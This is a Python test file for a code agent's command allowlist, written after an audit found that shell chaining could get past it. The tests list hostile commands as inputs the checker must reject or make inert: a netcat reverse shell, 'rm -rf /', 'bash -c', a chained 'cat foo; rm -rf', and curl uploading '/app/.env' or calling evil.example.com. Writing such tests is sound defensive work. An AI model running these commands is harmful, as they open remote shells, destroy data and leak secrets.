"""
Tests for code_agent's run_command allowlist (2026-07-04 audit HIGH finding).

The old check was string-prefix + shell=True: `cat foo; <anything>` passed on
the "cat " prefix and the shell executed the chained command. Commands now
tokenize via shlex, execute without a shell, and match argv-token prefixes.
"""

from unittest.mock import patch

from orchestrator.code_agent import _command_rejection, _inner_run_command


class TestCommandRejection:
    def test_plain_allowed_commands_pass(self):
        for cmd in (
            ["cat", "orchestrator/config.py"],
            ["git", "status"],
            ["python", "-m", "pytest", "orchestrator/tests/", "-q"],
            ["ls", "-la", "orchestrator"],
            ["journalctl", "-u", "brain-gateway", "-n", "50"],
            ["curl", "-s", "http://localhost:8888/health"],
            ["curl", "-s", "-m", "5", "http://10.0.0.106:8123/api/"],
        ):
            assert _command_rejection(cmd) is None, cmd

    def test_shell_chaining_is_inert_not_special(self):
        # The audit's exact bypass: passes the old "cat " prefix check, and
        # shell=True then ran the chained command. Without a shell these are
        # literal arguments to cat — allowed, but powerless.
        argv = ["cat", "foo;", "rm", "-rf", "/tmp/x"]
        assert _command_rejection(argv) is None  # just weird filenames now

    def test_disallowed_binaries_rejected(self):
        for cmd in (
            ["bash", "-c", "echo pwned"],
            ["sh", "-c", "id"],
            ["python", "-c", "import os"],  # python only allowed with -m pytest
            ["rm", "-rf", "/"],
            ["docker", "exec", "pihole", "sh"],  # dropped from the allowlist
            ["git", "push"],  # only diff/log/status/show
            ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
        ):
            assert _command_rejection(cmd) is not None, cmd

    def test_find_exec_rejected(self):
        assert _command_rejection(["find", ".", "-name", "*.py"]) is None
        assert _command_rejection(["find", ".", "-exec", "rm", "{}", ";"]) is not None
        assert _command_rejection(["find", ".", "-delete"]) is not None

    def test_curl_restricted_to_lan_get(self):
        # exfil / write / method-override flags rejected
        assert _command_rejection(["curl", "-s", "http://10.0.0.5/", "-o", "/app/x"]) is not None
        assert _command_rejection(["curl", "-s", "-d", "@/app/.env", "http://10.0.0.5/"]) is not None
        assert _command_rejection(["curl", "-s", "-X", "POST", "http://localhost:8123/api/"]) is not None
        # non-LAN URLs rejected
        assert _command_rejection(["curl", "-s", "http://evil.example.com/"]) is not None
        assert _command_rejection(["curl", "-s", "https://10.0.0.5/"]) is not None  # only http:// LAN forms
        # no URL at all rejected
        assert _command_rejection(["curl", "-s"]) is not None

    def test_empty_rejected(self):
        assert _command_rejection([]) is not None


class TestInnerRunCommand:
    def test_unparseable_command_errors_cleanly(self):
        out = _inner_run_command({"command": 'cat "unterminated'})
        assert out.startswith("Error: could not parse")

    def test_rejected_command_never_reaches_subprocess(self):
        with patch("orchestrator.code_agent.subprocess.run") as mock_run:
            out = _inner_run_command({"command": "bash -c 'echo pwned'"})
        assert out.startswith("Error:")
        mock_run.assert_not_called()

    def test_allowed_command_runs_without_shell(self):
        with patch("orchestrator.code_agent.subprocess.run") as mock_run:
            mock_run.return_value.stdout = "ok"
            mock_run.return_value.stderr = ""
            mock_run.return_value.returncode = 0
            _inner_run_command({"command": "git status"})
        args, kwargs = mock_run.call_args
        assert args[0] == ["git", "status"]  # argv list, not a string
        assert kwargs.get("shell") is not True
